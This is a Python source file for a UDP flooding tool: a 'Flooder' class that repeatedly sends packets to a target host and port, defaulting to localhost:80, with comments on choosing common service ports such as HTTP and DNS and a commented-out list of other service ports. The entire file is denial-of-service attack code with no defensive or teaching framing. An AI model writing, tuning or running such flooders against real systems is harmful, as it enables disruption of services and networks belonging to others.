import socket, time
# import threading

class Flooder():
    target_host: str = "localhost"
    # target_ports: list[int] = [42, 53, 67, 80, 123, 161, 162, 3389]

    # Often you pick a common service port like 80 (HTTP) or 53 (DNS)
    target_port: int = 80 #

    def __init__(self, target: str = None, port: int = None):
        self.target_host = target or self.target_host
        self.target_port = port or self.target_port

        self.running: bool = True
        self.socket = None

    def start(self, message: bytes = b"FLOOD_PACKET"):
        print(f"[i] Starting UDP flood on {self.target_host}:{self.target_port}")

        # Create the socket outside the loop to avoid recreation overhead
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

        try:
            while self.running:
                try:
                    # Send to the single target port
                    self.socket.sendto(message, (self.target_host, self.target_port))

                    print(f"[+] Sent packet to {self.target_host}:{self.target_port}")

                    time.sleep(0.01)

                except socket.error as e:
                    # Catch socket errors, but keep the loop running if possible
                    print(f"[!] Socket Error: {e}")
                    # You might want to break here if it's a persistent error, or just continue

                except Exception as e:
                    print(f"[!] General Error: {e}")

        except KeyboardInterrupt:
            print("\n[i] Flood interrupted by user (Ctrl+C).")
        finally:
            if self.socket:
                self.socket.close()
                print("[i] Flooder socket closed.")

    def stop(self):
        self.running = False
        print("[i] Stopping flooder...")
